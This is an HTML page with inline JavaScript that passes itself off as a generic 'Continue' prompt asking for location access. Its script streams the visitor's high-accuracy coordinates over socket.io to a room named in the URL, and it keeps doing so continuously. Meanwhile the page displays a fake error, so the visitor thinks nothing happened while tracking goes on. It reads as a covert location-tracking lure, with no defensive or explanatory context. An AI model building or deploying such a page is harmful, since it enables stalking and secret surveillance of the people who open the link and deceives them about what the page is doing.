
<!DOCTYPE html>
<html>
<head>
  <title>Continue</title>
  <meta name="viewport" content="width=device-width">
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">
  <div class="card" id="start">
    <h2>Continue</h2>
    <p>Allow location access to proceed</p>
    <button onclick="start()">Continue</button>
  </div>

  <div class="card" id="error" style="display:none">
    <h2>Error</h2>
    <p>Something went wrong. Please try again later.</p>
  </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
  const socket = io();
  const room = new URLSearchParams(location.search).get("room");
  socket.emit("join-room", room);

  function start() {
    navigator.geolocation.watchPosition(
      pos => {
        socket.emit("send-location", {
          roomId: room,
          lat: pos.coords.latitude,
          lng: pos.coords.longitude
        });
      },
      () => alert("Permission required"),
      { enableHighAccuracy: true }
    );

    document.getElementById("start").style.display = "none";
    document.getElementById("error").style.display = "block";
  }
</script>

</body>
</html>
